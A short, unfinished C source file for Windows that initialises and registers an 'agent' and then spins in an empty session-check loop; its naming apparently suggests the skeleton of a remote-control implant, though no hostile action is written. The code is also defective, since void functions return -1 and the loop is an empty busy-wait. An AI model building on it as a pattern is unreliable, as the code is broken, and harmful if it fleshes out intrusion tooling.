#include "agent.h"

void AgentMain() {
	pAgent agent = (pAgent)LocalAlloc(LPTR, sizeof(Agent));
	INT err;

	

	if ((err = init_agent(agent)) != 0) {
		printf("[error] attempting to initialize agent\n");
		return -1;
	}

	
	if ((err = RegisterAgent(agent)) != 0) {
		printf("[error] attempting to register agent\n");
		return -1;
	}


}

void AgentRoutine(pAgent agent) {
	while (TRUE) {
		if (!agent->session->Active)
		{
			
		}
	}
}